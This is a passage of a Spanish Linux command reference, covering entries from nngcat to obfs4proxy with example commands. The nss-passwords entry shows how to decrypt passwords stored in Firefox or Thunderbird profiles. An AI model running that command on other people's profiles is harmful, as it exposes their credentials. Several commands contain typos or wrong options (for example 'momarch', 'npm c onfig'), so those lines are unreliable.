$ nngcat --pair1 --url tcp://127.0.0.1:5558 (ambos nodos, pair1 y pair2 pueden enviar y recibir mensajes entre sí)
$ nngcat --pair2 --url tcp://127.0.0.1:5558
$ nngcat --bus --url tcp://127.0.0.1:5559 --name node1 (todos los nodos conectados al bus reciben los mensajes de los demás)
$ nngcat --bus --url tcp://127.0.0.1:5559 --name node2
1.-
Ejemplo práctico: Pub/Sub**
En una terminal ejecutar el suscriptor:
$ nngcat --sub --url tcp://127.0.0.1:5555 --sub topic:noticias
En otra terminal ejecutar el publicador
$ nngcat --pub --url tcp://127.0.0.1:5555
Escribir un mensaje en el publicador y se verá cómo aparece en el suscriptor.


nnn
Administrador de archivos. Muestra en primer lugar los directorios y luego los archivos. La configuración personal se realiza en el archivo ~/.nnncp al estilo:
$ nano .nnncp
	PWD: /home/USER
	SHELL: /bin/bash (null)
	EDITOR: nano (null)
$ nnn
Algunas teclas:
	flechas derecha/izquierda (entrar/salir del directorio hacia/desde directorios superiores o inferiores)
	flechas arriba/abajo (subir/bajar en el arbol del directorio)
	enter (abrir un archivo)
	q (salir)
	? (muestra las teclas de control))


nocache
Omitir o minimizar la caché del sistema de archivos de un programa al pedir al kernel que no guarde las páginas, o que las descarte inmediatamente; no es un “apagado” de la caché global sino un intento de minimizar el impacto del proceso. Incluye los ejecutables cachedel y cachestats.
# nocache -n 3 dd if=/dev/zero of=/tmp/prueba.img bs=1M count=1024 (dd crea un fichero grande; con nocache se intenta que las páginas escritas no se mantengan en la caché de páginas del kernel)
# nocache -n 3 dd if=/tmp/prueba.img of=/dev/null bs=4M (medir rendimiento)
# nocache -n 3 tar -xvf grande.tar -C /destino (reduce la probabilidad de que los ficheros extraídos queden en memoria de páginas y perjudiquen a otros procesos)
# time nocache -n 3 dd if=/ruta/grande.img of=/dev/null bs=4M (intenta que las páginas leídas no permanezcan en page cache, de modo que cada lectura refleje I/O real de disco)
# nocache tar -xvf grande.tar (evita que las páginas de los ficheros extraídos permanezcan en cache y contaminen la memoria de archivo)
# cachedel /tmp/prueba.img (eliminar del page cache las páginas asociadas a uno o varios ficheros)
# cachedel /ruta/al/fichero1 /ruta/al/fichero2 (expulsar del page cache las páginas asociadas a archivos dados)
# cachestats /tmp/prueba.img (mostrar estadísticas o información práctica sobre la caché relacionada con ficheros o el sistema)
Nota.- Algunos binarios setuid/sgid y aplicaciones que usan O_DIRECT o cierto mapeo no son afectadas por nocache.
1.-
Comprobación de eliminar cache
$ free -h (comprobar)
$ echo 3 > /proc/sys/vm/drop_caches (borra caches a nivel global)
· free -h (volver a comprobar las dieferencias)


noclobber
Es una opción de la shell [ver set] que permite protegerse de un borrado involuntario de archivos. Esta opción se encuentra desactivada por defecto. Puede configurarse de forma permanente en el archivo .bashrc.
$ set -o noclobber (activarla)
$ set +o noclobber (desactivarla)
Veamos todo un proceso activando la opción y viendo como saltarsela:
	$ date > fecha.txt (escribir la fecha en un archivo)
	$ set -o noclobber (activar la opción)
	$ date > fecha.txt (intentar de nuevo escribir en el archivo sin lograrlo)
	bash: fecha.txt: Cannot overwrite existing file
	$ date >| fecha.txt (saltarse la protección con >|)


nodau
sencillo programa para tomar notas basado en consola. Le permite crear, editar y ver notas fácilmente, y buscarlas por nombre o fecha
$ nodau new linux (crear una nueva nota con el nombre "linux")
$ nodau edit linux (editar la nota "linux")
$ nodau list (listar todas las entradas)
$ nodau list linux (ver si existe una nota llamada "linux")
$ nodau show linux (muestra el contenido de la nota "linux")
$ nodau encrypt emacs (encriptar la nota "emacs". Pide contraseña y confirmación)
$ nodau decrypt emacs (pide contraseña y lo desencripta sin mostrar)
$ nodau append linux (añadir datos a la entrada "linux" sin sobreescribirla)
$ nodau del linux (elimina la nota "linux")


node
Node.js es un entorno o motor que permite ejecutar JavaScript fuera del navegador, normalmente en un servidor. Ver npm
$ nano servidor.js
       // servidor.js
       const http = require('http');
       const server = http.createServer((req, res) => {
         res.end('Linux es un sistema genial');
       });
       server.listen(3000, () => {
         console.log('Servidor escuchando en http://localhost:3000');
       });
$ node servidor.js (ejecutar)
Y se tendrá un servidor web que responde con "Linux es un sistema genial" en http://localhost:3000.


nodm
Pquete que prepara el sistema para iniciar automáticamente una sesión X al arrancar. Está diseñado para dispositivos como smartphones, pero también puede utilizarse en un ordenador personal, siempre que las implicaciones de seguridad sean aceptables.


nohang
Demonio inteligente que monitorea la memoria del sistema y actúa proactivamente para evitar que ocurra el OOM Killer [Out Of Memory Killer] del kernel Linux, que suele matar procesos de forma abrupta cuando la memoria se agota. A diferencia del OOM Killer tradicional que actúa cuando ya es demasiado tarde, nohang detecta situaciones de estrés de memoria antes de que ocurra el bloqueo del sistema. Incluye los ejecutables oom-sort, psi-top y psi2log.
# systemctl status nohang (al instalarlo ya se activa, si no es el caso activarlo)
# nohang --check -c /etc/nohang/nohang.conf (chequear el archivo de configuración)
# oom-sort (mostrar procesos ordenados por uso de memoria)
# oom-sort -e (mostrar en formato extendido)
# oom-sort | head -10 (solo mostrar los top 10 procesos)
# psi-top (monitor de presión de recursos)
# psi-top -m cpu (de la cpu)
# psi-top -m io (de la io)
# journalctl -u nohang -f (ver logs de actividad)
# nohang -m (modo de prueba de memoria)
# psi2log  (ver logs PSI en tiempo real)
Nota.- PSI mide el tiempo que los procesos esperan por recursos [CPU, memoria, I/O], lo que es un mejor indicador de estrés del sistema que solo el uso de memoria.


nohup
permite mantener activo un proceso, incluso después de haber cerrado la sesión de usuario.
$ nohup sleep 10000 &   (lanzar el proceso)
[1] 9215     (PID del proceso. Con CTROL-C liberamos el promt y cerramos terminal)
$ pidof sleep   (en otra terminal para verificar que el proceso sigue activo)
$ kill -9 9215  (matar el proceso)


noip2
Servicio de redireccionamiento de ip dinamica a fija. Requiere registro en www.no-ip.com
# noip2 -C    (Inicio de la configuración del servicio)
	Please enter the login/email string for no-ip.com (usuario registro no-ip.com)
	Please enter the password for user ‘usuario@email.com’ (Contraseña no-ip)
	Please enter an update interval:[30] (Intervalo de tiempo para actualización)
	Do you wish to run something at successful update?[N] (y/N)  (intro)
	New configuration file ‘/etc/no-ip2.conf’ created.
# ps aux | grep noip (Comprobar si está corriendo el servicio)
# noip2 -S (Muestra información sobre el proceso activo)
# noip2 -K 1234 (Mata el proceso de noip con el número que le indiquemos)
# noip2 -M (permite multiple instancias de noip2)
# noip2 -i 192.168.1.2 (Forzar a que noip2 actualice los dominios con la IP suministrada)
# noip2 -I eth1 (Forzar que noip2 se conecte a internet con la tarjeta de red especificada)
Nota.- En algunas distros, para iniciar el servicio al inicio:
# nano /etc/rc.local
Y colocar, según donde se encuentre el ejecutable, la linea:
/usr/local/bin/noip2 &


nologin
Muestra un mensaje de que una cuenta no está habilitada. Está destinado como un campo de shell de reemplazo para las cuentas que estan deshabilitadas.
# nano /etc/passwd
...
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...


nom
Paquete humorístico de línea de comandos que ayuda a perder peso mediante el seguimiento del consumo de energía y la creación de un ciclo de retroalimentación negativa. Está inspirada en La Dieta del Hacker de John Walker [https://www.fourmilab.ch/hackdiet/] e intenta automatizar las tareas al máximo.
$ nom (pregunta "peso" y "peso objetivo" y luego dice la suya)


nomarch
Descomprime archivos .ARC y .ARK de MS-DOS. Este paquete reemplaza exclusivamente el archivador arc de SEA para la descompresión. Solo funciona para descomprimir, no para crear archivos .ARC o .ARK.
$ nomarch -p archivo.arc (extraer en la salida estándar)
$ nomarch -l archivo.arc (por defecto muestra el nombre del archivo, el tamaño sin comprimir, y la fecha y hora)
$ momarch -t archivo.arc (verificar que el archivo no esté corrupto)
$ momarch -U archivo.arc (conserva las mayúsculas y minúsculas originales del archivo)


normalize
Ajustar volumen.
$ normalize-audio *.wav
$ normalize-mp3 *.mp3


normalizer
Informa de la codificación de origen utilizada en un archivo de texto. Normaliza el texto a Unicode.
$ normalizer text.txt
$ normalizer -n text.txt (normaliza el archivo de entrada. Si no se establece, el programa no escribe nada.)


notify
[libnotify-bin]. Aviso o notificación que lanza el sistema al producirse un evento o terminar una tarea.
$ notify-send "Linux es un sistema genial" -t 5000
Un ejemplo de uso para algunas tareas:
$ nano .bashrc
Añadir las siguientes dos lineas:
alias alert_helper='history|tail -n1|sed -e "s/^\s*[0-9]\+\s*//" -e "s/;\s*alert$//"'
alias alert='notify-send -i /usr/share/icons/gnome/32×32/apps/gnome-terminal.png "[$?] $(alert_helper)"'
Guardar y recargar bashrc:
$ source .bashrc
Otros ejemplos:
$ find /home/$USER -iname *.jpg; notify-send "El comando ha terminado su labor."
$ sleep 10; alert
$ find /home/$USER -iname *.jpg; notify-send -i gtk-dialog-warning -t 4000 "ATENCIÓN" "El comando find ha terminado..."
opciones:
-i especifica el icono a usar
-t tiempo en milisegundos que se mostrará la nota


notus-scanner
Detecta productos vulnerables en el entorno de sistema. El método de escaneo consiste en evaluar la información interna del sistema detectando incluso productos inactivos porque no necesita interactuar con cada uno de los productos.
# notus-scanner


npm
[Node Package Manager]. Es el gestor de paquetes para la plataforma JavaScript Node.js [ver node]. Coloca los módulos en la ubicación adecuada para que Node.js pueda encontrarlos y gestiona los conflictos de dependencias de forma inteligente. Se utiliza principalmente para publicar, actualizar, gestionar módulos, descubrir, instalar y desarrollar programas Node.js. Incluye las herramientas arborist, npm-arborist, npx, pacote y qrcode-terminal
Ejemplo de crear un proyecto y usar npm
$ mkdir mi-proyecto
$ cd mi-proyecto
$ npm init -y (crea package.json con configuración básica)
$ npm install express (instala el framework web "Express" dentro del proyecto. El archivo package.json ahora sabrá que el proyecto depende de Express)
$ node server.js (arrancar el servidor. Si es en local con http://localhost:3000)
$ node -e "require('npm-arborist')().loadActual().then(tree => console.log(tree.inventory.size))" (mostrar el número de dependencias realmente instaladas en el proyecto)
$ npx cowsay "Hola desde npx" (descargará temporalmente el paquete "cowsay" y lo ejecutará)
$ npx eslint . (ejecutar una herramienta local del proyecto aunque esté instalada solo en el proyecto)
$ npm fund (ver detalles de paquetes)
$ npm uninstall express (desinstalar un módulo)
$ npm update (actualizar todo)
$ npm run start (ejecutar scripts definidos en package.json)
$ npm init --yes (inicializar un proyecto. Se crea el archivo package.json)
$ npm up -g paquete1 paquete2 (actualiza a la última versión paquete1 y paquete2)
$ npm i paquete -g (instalar un paquete de forma global)
$ npm c onfig list (ver ubicación de los paquetes globales npm)
$ npm list -g (listar los paquetes globales instalados)
$ npm outdated -g  (ver qué paquetes deben actualizarse)
$ npm run (lista de scripts disponibles)
$ npm restart (reiniciar un proyecto)
$ npm star (arrancar un proyecto)
$ npm stop (parar proyecto)
pacote es el módulo que usa npm para descargar e instalar paquetes desde el registro [npmjs.com]. Es una librería técnica, no un comando de uso común.


npm2deb
Esta aplicación simplifica el empaquetado de módulos de Node.js disponibles a través de npm. También permite listar las dependencias de los módulos y comprobar cuáles ya están disponibles como paquetes Debian.
$ npm2deb view wscat (ver información sobre un módulo)
$ npm2deb depends pacote (ver si un módulo tiene dependencias)
$ npm2deb search spawn-wrap (buscar un módulo)


nproc
Muestra el número de procesadores o cores.
# nproc


nrg2iso
Convertir imagen nrg a iso
$ nrg2iso imagen.nrg imagen.iso


nrss
Lector de noticias rss. No acepta importación de archivos opml. La configuración en ~/.nrss/config. Un ejemplo:
$ nano .nrss/config
	default_rate "5"
	default_show "30"
	default_maxitems "50"
	# add feeds
	add "http://www.hackplayers.com/feeds/posts/default?alt=rss" "hackplayers"
	add "https://andalinux.wordpress.com/feed/" "informatico de guardia"
	add "https://ubuntulife.wordpress.com/feed/" "ubuntu life"
	# navegador
	browser "/usr/bin/firefox %u"
Teclas de uso:
	h (ver uso)
	C (contraer todos los feeds)
	Espacio (Contraer un feed o leer una historia)
	g (ir a la url con el navegador definido)
	x (Mostrar todas las noticias del feed)
	r (Actualiza el feed actual)
	R (Actualizar todos los feeds)
	M (Marcar todo como leído)
	q (salir)


nscd
Demonio que cada vez que se reinicia, elimina los datos de la caché DNS. Para mayor efectividad colocar en el cron.
# /etc/init.d/nscd restart


nsenter
Utilidad de Linux que permite ejecutar un comando en el espacio de nombres de un proceso en ejecución. Los espacios de nombres son una característica del kernel de Linux que proporciona entornos aislados para procesos y son utilizados por ejemplo, por Docker para crear contenedores aislados.
# nsenter --target 841052 --all ip a (Ejecutar el comando "ip" con el argumento "a" utilizando el mismo espacio de nombres que un proceso con pid 841052)
Podemos sustituir "--all" por: --net, --pid, --ipc
# nsenter --target pid --net command command_arguments (Ejecutar un comando en el espacio de nombres de red de un proceso existente)
# nsenter --target pid --pid command command_arguments (Ejecutar un comando en el espacio de nombres PID de un proceso existente)
# nsenter --target pid --ipc command command_arguments (Ejecutar un comando en el espacio de nombres IPC de un proceso existente)
# nsenter --target 841052 --uts --time --ipc -- ip a (Ejecutar el comando "ip" con el argumento "a "en los espacios de nombres UTS, time e IPC del proceso con pid 841052)
# nsenter --pid=/proc/325/pagemap -- ip a (Ejecutar "ip a" de nombres de un proceso existente haciendo referencia a procfs)


nslookup
saber si las DNS resuelven correctamente los nombres y las IP
$ nslookup ip_o_nombre_host
$ nslookup `curl ifconfig.me` (conocer la IP pública)
1.-
Conocer las DNS del equipo:
	$ nslookup (Darle enter y al entrar en el prompt colocar "server")
	> server
	Default server: 80.58.61.250
	Address: 80.58.61.250#53
	Default server: 80.58.61.254
	Address: 80.58.61.254#53


nss-passwords
Programa que lee las contraseñas en las claves utilizados por los productos de Mozilla, como Firefox y Thunderbird.
$ nss-passwords -d ~/pass -p pwdecrypt nombre (especificando el directorio del perfil. Por defecto el de Firefox, usando el programa pwdecrypt. Por defecto pinentry y "nombre" que se buscará en las entradas de claves)


nsswitch
El archivo de configuración del conmutador de servicio de nombres (NSS), /etc/nsswitch.conf, es utilizado por la biblioteca C de GNU y algunas otras aplicaciones para determinar las fuentes de las que se obtiene información sobre el servicio de nombres en una serie de categorías y en qué orden. Cada categoría de información se identifica mediante un nombre de base de datos. El archivo es texto ASCII simple, con columnas separadas por espacios o caracteres de tabulación. La primera columna especifica el nombre de la base de datos. Las columnas restantes describen el orden de las fuentes a consultar y un conjunto limitado de acciones que se pueden realizar según el resultado de la búsqueda. El archivo /etc/nsswitch.conf define el orden en el que el sistema comprueba los archivos /etc/hosts y /etc/resolv.conf. Este archivo también define el orden de búsqueda predeterminado para muchos otros servicios, como nombre de host, usuarios, grupos, contraseñas, etc.
# cat /etc/nsswitch.conf | grep hosts
Donde "files" representa el archivo /etc/hosts, "dns" indica el servidor DNS configurado en el archivo /etc/resolv.conf y "myhostname" es el valor predeterminado. Si las opciones "files" y "dns" no funcionan, Linux utiliza este valor como el nombre predeterminado para la máquina local.


nstat
Muestra las estadísticas de la red.
$ nstat
$ nstat -z (Mostrando los contadores a cero. Por defecto no se muestran)
$ nstat -a (Volcado absoluto de todos los contadores)
$ nstat -r (Resetear los contadores)


nsupdate
[bind9-dnsutils]. Se utiliza para enviar solicitudes de actualización de DNS dinámico, como se define en RFC 2136, a un servidor de nombres. Esto permite agregar o eliminar registros de recursos de una zona sin editar manualmente el archivo. Una sola solicitud de actualización puede contener solicitudes para agregar o eliminar más de un registro de recursos.
$ nsupdate
1.-
Ejemplo en el que queremos agregar un registro A para el nombre servidor1.example.com con la dirección IP 192.168.1.10.
        nsupdate -k clave.tsig
        > server dns.example.com
        > zone example.com
        > update add servidor1.example.com 3600 A 192.168.1.10
        > send
Nota.- -k especifica la clave TSIG [Transaction Signature] para autenticar las actualizaciones.
2.-
Eliminar el registro A que acabamos de agregar:
        nsupdate -k clave.tsig
        > server dns.example.com
        > zone example.com
        > update delete servidor1.example.com A
        > send
3.-
Agregar un registro CNAME que apunte www.example.com a servidor1.example.com:
        nsupdate -k clave.tsig
        > server dns.example.com
        > zone example.com
        > update add www.example.com 3600 CNAME servidor1.example.com
        > send
4.-
Modificar un registro existente para cambiar la dirección IP de un registro A existente:
        nsupdate -k clave.tsig
        > server dns.example.com
        > zone example.com
        > update delete servidor1.example.com A
        > update add servidor1.example.com 3600 A 192.168.1.20
        > send
5.-
Agregar un registro TXT
        nsupdate -k clave.tsig
        > server dns.example.com
        > zone example.com
        > update add servidor1.example.com 3600 TXT "Este es un registro TXT"
        > send
Las actualizaciones dinámicas suelen requerir autenticación mediante una clave TSIG. Esta clave debe ser configurada tanto en el servidor DNS como en el cliente que realiza las actualizaciones. El TTL [Time To Live] especifica cuánto tiempo debe almacenarse en caché el registro antes de que se considere obsoleto. En los ejemplos, se usa un TTL de 3600 segundos [1 hora].
6.-
Ejemplo de archivo de clave TSIG típico [clave.tzig] podría verse así:
        key "clave-tsig" {
            algorithm hmac-md5;
            secret "base64-encoded-secret";
        };
Este archivo debe ser referenciado en la configuración del servidor DNS y en el comando nsupdate mediante la opción -k.


ntfs-3g
[fuse]. Driver que permite modificar archivos en sistemas ntfs. La partición puede ser montada:
# mount -t ntfs-3g /dev/hda3 /media/win
O en el /etc/fstab con la linea:
/dev/hda3  /media/win ntfs-3g defaults 0 0


ntfsclone
[ntfsprogs]. Permite la creación de particiones NTFS de Windows y su posterior restauración
# ntfsclone -s -o imagen.img /dev/sda1 (crea el fichero imagen.img de la partición /dev/sda1)
# ntfsclone -r -O /dev/sda1 imagen.img (Restaura la imagen en la partición que queramos)


ntfsfix
[ntfsprogs]. Reparación de inconsistencias en sistemas de archivos ntfs.
# ntfsfix /dev/sdb1
Finalizado el proceso, montarla:
# mount -t ntfs-3g /dev/sdb1 /media/win -o force


ntfslabel
[ntfsprogs]. Poner etiquetas a las particiones y dispositivos ntfs
# ntfslabel -f -v /dev/sda1 win


ntop
[graphviz gsfonts-x11]. Monitor de red via navegador. Ha sido reemplazado por ntopng.
# ntop --set-admin-password   (contraseña para el usuario "admin")
# gedit /var/lib/ntop/init.cfg (Comprobar interfaz de red. Por defecto eth0)
# /etc/init.d/ntop restart (reiniciar)
Visualizar los informes en el navegador <http://localhost:3000>


ntopng
Muestra el uso de la red.
# ntopng -i eth0
# ntopng -d  (especifica el directorio de datos. Por defecto /var/lib/ntopng)
# ntopng -i tcp://192.168.1.1:5556 (especificando protocolo, host y puerto)


ntpdate
Actualiza la hora del sistema via NTP (Network Time Protocol)
# ntpdate -u cl.pool.ntp.org


number
[bsd-games]. Muestra como se muestran los números en inglés.
$ number -l 55
$ number (Entra en el promt para ir entrando números. “q” [enter] para salir)


numdiff
Aplicación que se puede utilizar para comparar archivos supuestamente similares línea por línea y campo por campo, ignorando pequeñas diferencias numéricas o diferentes formatos numéricos. Es similar a diff[ver], pero tiene en cuenta los números de coma flotante, incluidos los números complejos y de precisión múltiple. Numdiff es útil para comparar archivos de texto que contienen campos numéricos, al probar o realizar controles de calidad en computación científica o en análisis numérico.
$ numdiff archivo archivo1


numfmt
Convertir números a formatos legibles por humanos.
$ numfmt --to=si 500000
$ numfmt --to=iec-i 500000
$ numfmt --from=si 1M
$ numfmt --from=auto 1Mi
$ numfmt --from=si --to=iec 1T
$ numfmt --from=auto --to=iec 1T


numlockx
Activar el bloqueo numerico al inicio:
$ numlockx on/off  (activarlo/desactivarlo)


num-utils
Conjunto de programas para manejar números desde la línea de comandos. Al igual que otras utilidades de línea de comandos, como grep, awk, sort, cut o etc estas utilidades funcionan con datos tanto de archivos estándar como de archivos. Inclye los siguientes ejecutables: numaverage [programa para calcular el promedio de números],  numbound [encuentra los números de límite mínimo y máximo de la entrada], numinterval [Muestra los intervalos numéricos entre cada número de una secuencia], numnormalize [Normaliza un conjunto de números entre 0 y 1 de forma predeterminada], numgrep [Como grep normal, pero para conjuntos de números], numprocess [Realiza operaciones matemáticas con números], numsum [Suma todos los números], numrandom [Genera un número aleatorio a partir de una expresión dada], numrange [Genera un conjunto de números en una expresión de rango] y numround [Redondea cada número según su valor]


nuspell
Corrector ortográfico diseñado para idiomas con morfología rica y composición de palabras compleja.
$ nuspell
  INFO: Locale LC_CTYPE=ca_ES.UTF-8, Input encoding=UTF-8, Output encoding=UTF-8
  INFO: Pointed dictionary /usr/share/hunspell/ca_ES.aff
  Enter some text:
$ nuspell file.txt


nuttcp
Herramienta de medición del rendimiento de la red cliente/servidor.
$ nuttcp IP (uso básico)
$ nuttcp -s IP (que la ip especificada sea el receptor)
$ nuettcp - IP (que la ip especificada sea el transmisor)


nvme-cli
[NVM Express]. Herramienta para interactuar con unidades de almacenamiento NVMe [Non-Volatile Memory Express], que son SSDs modernos conectados directamente a través del bus PCIe. Esta herramienta permite consultar información del dispositivo, realizar pruebas de rendimiento, actualizar firmware, gestionar espacios de nombres, etc.
# nvme list (mostrar todos los controladores NVMe y sus espacios de nombres)
Algunos conceptos de la salida:
        /dev/nvme0n1 --> dispositivo NVMe [n0 = controlador 0, n1 = namespace 1].
        SN --> número de serie.
        Model --> modelo del SSD.
        FW Rev --> versión del firmware.
# nvme id-ctrl /dev/nvme0 (información detallada del controlador: capacidades, versión del controlador, soporte de características...)
Nota.- Usa /dev/nvme0 [el controlador], no /dev/nvme0n1 [el namespace].
# nvme id-ns /dev/nvme0n1 (información del namespace: tamaño, formato de LBA, etc)
# nvme smart-log /dev/nvme0 (muestra el estado de salud del SSD [SMART]: desgaste, temperatura, errores...)
Nota.- percentage_used es la estimación del desgaste, 100% = vida útil agotada y critical_warning, 0 = todo bien; cualquier otro valor indica problemas
# nvme smart-log /dev/nvme0 | grep 'temperature' (mostrar la temperatura)
# nvme read /dev/nvme0n1 --start-block=0 --block-count=2097152 --data-size=1073741824 --output-file=read_test.bin (realizar una prueba de rendimiento [lectura/escritura]. Puede sobrescribir datos. Úsar solo en dispositivos de prueba)
# nvme format /dev/nvme0n1 (formatear el dispositivo NVMe. Destruye todos los datos)
# nvme format /dev/nvme0n1 --lbaf=0 --ms=0 (especificar tamaño de LBA, protección, etc)
# nvme id-ns /dev/nvme0n1 (muestra las opciones de formato [lbaf - Logical Block Address Format]).
# nvme error-log /dev/nvme0 (muestra los últimos errores registrados por el controlador)
# nvme fw-log /dev/nvme0 (consultar las revisiones disponibles del firmware)
Si se tiene un archivo de firmware [firmware.bin] se puede actualizar, pero una actualización fallida puede dejar el SSD inutilizable:
# nvme fw-download /dev/nvme0 --fw=/ruta/a/firmware.bin --xfer=4096
# nvme fw-commit /dev/nvme0 --slot=1 --action=2


nvram-wakeup
Puede leer y escribir en la BIOS la hora de activación del encendido autormático del pc si este tiene soporte RTC [soporte Real-Time Clock]. A la hora de arrancar, la computadora se encenderá automáticamente desde el estado de apagado. La utilidad rtcwake [ver] es un reemplazo moderno de nvram-wakeup.
# nvram-wakeup -w 7 (Comenzar 7 minutos antes de la hora de arrancar [el valor predeterminado es 5, más que suficiente])


nvtop
Interfaz de monitoreo basada en ncurses que proporciona información sobre los estados de GPU, utilización de memoria, temperatura, etc e información sobre los procesos que se se estan ejecutan en las GPU.
$ nvtop


nwrite
Enviar mensajes entre terminales
$ nwrite usuario /dev/pts/numero_consola


nyancat
es un programa que muestra un gato poptart animado en la terminal.
$ nyancat -n -s -f 50 (sin contar el tiempo, sin titulo y parar a los 50 frames [5 segundos])


nyx
Monitor de estado en terminal para Tor, diseñado para usuarios que necesitan supervisar la actividad y el estado de su conexión Tor en tiempo real como ancho de banda, CPU, memoria, configuración, IPs, nombre de host, logs...
# nyx (iniciar)
# nyx -i 127.0.0.1:9051 (especificando puerto)
# nyx --password "mi_contraseña" (si requiere contraseña para el control)
Configuración básica:
# nano /etc/tor/torrc
Descomentar las lineas:
            ControlPort 9051
            CookieAuthentication 1
# systemctl restart tor (reiniciar el servicio despues de los cambios)


o-saft
[Owasp Ssl Advanced Forensic Tool]. Herramienta forense avanzada para SSL [Secure Sockets Layer - capa de sockets seguros] desarrollada por OWASP para la auditoría y análisis forense de conexiones SSL/TLS. Permite mostrar información detallada sobre los certificados SSL de un servidor y probar la conexión SSL usando diferentes listas de cifrados y configuraciones, ayudando a identificar posibles debilidades o configuraciones incorrectas en la seguridad de la capa de transporte.
$ o-saft www.ejemplo.com (mostrar información básica del certificado SSL del dominio especificado)
$ o-saft -ciphers www.ejemplo.com (listar y probar todos los cifrados que acepta el servidor remoto)
$ o-saft -cert www.ejemplo.com (despliega detalles completos del certificado, como el emisor, el sujeto, la validez, etc.)
$ o-saft -ssl2 -ssl3 -tls1 -tls1_1 -tls1_2 -tls1_3 www.ejemplo.com (verifica qué versiones de SSL/TLS están habilitadas en el servidor)


o3read
wget http://siag.nu/pub/o3read/o3read-0.0.4.tar.gz
Paquete que contiene herramientas [o3tohtml, o3totxt] para convertir archivos en formato openoffice o libreoffice a html o txt. Los ficheros de openoffice/libreoffice son formatos comprimidos. El que contiene el texto es el archivo “content.xml” que es el que se ha de descomprimir con unzip antes de tunelarlo a la aplicación.
$ unzip -p archivo.odt content.xml | o3totxt > archivo.txt
$ unzip -p archivo.sxw content.xml | o3tohtml > archivo.html


oathtool
Kit de herramientas OATH [Open AuTHentication] que proporciona componentes para crear sistemas de autenticación de contraseñas de un solo uso [OTP]. Contiene un módulo PAM, el algoritmo HOTP [Hmac-based One-Time Password] basado en eventos [RFC 4226], el algoritmo TOTP [Time-based One-Time Password] basado en tiempo [RFC 6238] y el Contenedor de Claves Simétricas Portátil [PSKC, RFC 6030] para gestionar los datos de claves secretas codificadas en base32 o hexadecimal. TOTP genera un código que cambia cada cierto tiempo, por defecto cada 30 segundos. Usa el tiempo actual y HOTP genera códigos basados en un contador. Ambos usan una clave secreta compartida entre el cliente y el servidor.
$ oathtool --totp -b JBSWY3DPEHPK3PXP (genera el mismo código que daría una app de autenticación como Google Authenticator)
$ oathtool --totp -b --verbose JBSWY3DPEHPK3PXP (ver más información)
$ oathtool -b --counter=0 JBSWY3DPEHPK3PXP (cada vez que incrementes el contador, generará un código diferente [counter=2])
$ echo 54 | oathtool - (generar la primera contraseña de un solo uso basada en eventos [HOTP] para una clave de todos ceros)
$ oathtool --base32 -w 3 GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ (genera 3 codigos)


obconf
Herramienta para la configuración gráfica de entornos de escritorio ligeros (lxde, openbox...)


obexftp
Herramienta que permite transferir archivos utilizando FUSE entre la computadora y dispositivos móviles como teléfonos celulares u otros dispositivos que soporten el protocolo OBEX [OBject EXchange]. Lo más destacado es que permite montar el sistema de archivos de estos dispositivos directamente en el sistema Linux, como si fuera una unidad externa. Soporta dispositivos conectados por cable serie, IrDA, Bluetooth o USB. Incluye las utilidades obexautofs [Montaje automático de dispositivos OBEX], obexfs, obexftp, obexftpd, obexget, obexls, obexput y obexrm
$ hcitool scan (listar dispositivos Bluetooth disponibles)
$ obexftp-client -b 00:11:22:33:44:55 -B 10 -p ~/punto_montaje (especifica la dirección Bluetooth, el canal Bluetooth, usualmente 10 para OBEX y la carpeta donde montar el dispositivo)
$ obexftp -b 00:11:22:33:44:55 -B 10 -p archivo_local.txt /carpeta_remota/ (transferir un archivo a un dispositivo)
$ obexftp -b 00:11:22:33:44:55 -B 10 -g "archivo_remoto.jpg" -p carpeta_local/ (obtener un archivo del dispositivo)
# obexftpd -b (iniciar el servidor OBEX que escuchará conexiones Bluetooth)
# obexls -b AA:BB:CC:DD:EE:FF /Music (listar el contenido de un subdirectorio)
# obexget -b AA:BB:CC:DD:EE:FF -l / (listar los archivos disponibles en el dispositivo)
# obexget -b AA:BB:CC:DD:EE:FF -o ~/descargas/mi_archivo.jpg /DCIM/Camera/archivo.jpg (recibir un archivo específico)
# obexput -b AA:BB:CC:DD:EE:FF ~/mis_documentos/informe.pdf /informe.pdf (enviar un archivo a la raíz del dispositivo)
# obexput -b AA:BB:CC:DD:EE:FF ~/imagenes/foto.jpg /Pictures/foto.jpg (enviar un archivo a un directorio específico en el dispositivo)
# obexrm -b AA:BB:CC:DD:EE:FF /temp/archivo_viejo.txt (eliminar un directorio, puede requerir el flag -r recursivo en algunos dispositivos, aunque no es estándar en OBEX)
1.-
Configuración de obexautofs, módulo para autofs:
# nano /etc/auto.master
Añadir la línea:
       /media/obex  /etc/auto.obex --timeout=5 --browse
Crear el archivo de configuración para OBEX
# nano /etc/auto.obex
aÑADIR LA LINEA:
       micelular -fstype=obexfs,source=:MAC_DEL_DISPOSITIVO:
Nota.- La MAC_DEL_DISPOSITIVO se puede obtener con "hcitool scan" [ver]
# mkdir /media/obex/micelular (crear el directorio de montaje)
# systemctl restart autofs (reinicia el servicio)
Ahora, cuando se acceda al directorio /media/obex/micelular, autofs intentará conectar con el dispositivo Bluetooth con la dirección MAC especificada y montará su sistema de archivos OBEX.
2.-
Montaje manual de sistemas de archivos OBEX usando FUSE
$ mkdir ~/mi_telefono (crear un directorio de montaje)
# obexfs -b AA:BB:CC:DD:EE:FF ~/mi_telefono (montar el sistema de archivos OBEX del dispositivo con su MAC)
Pedirá que se autorice la conexión en el dispositivo
# fusermount -u ~/mi_telefono (desmonta el sistema de archivos)
3.-
Configuración en fstab para montaje automático
# nano /etc/fstab
Añadir la linea:
       obexftp#-b00:11:22:33:44:55 /media/telefono fuse user,noauto 0 0


obfs4proxy
[OBFuScation]. Herramienta que intenta eludir la censura transformando el tráfico Tor [ver] entre el cliente y el puente [bridge], para que, los censores, que suelen supervisar el tráfico, lo vean transformado con apariencia inocente e inocua en lugar del tráfico Tor real. Este paquete incluye el cliente y el puente en un solo programa. No se usa directamente por el usuario final con comandos manuales, es llamado automáticamente por el cliente Tor cuando está configurado para usar un puente obfs4. Es la cuarta versión, más resistente a técnicas de detección modernas como DPI [Deep Packet Inspection].
Conseguir un bridge obfs4 en la página oficial de bridges de Tor https://bridges.torproject.org/, marca la opción que dice: "I am not a robot" [puede pedir captcha] y seleccionar la opción "obfs4" y al clicar en "Get Bridges" se obtiene una linea similar a
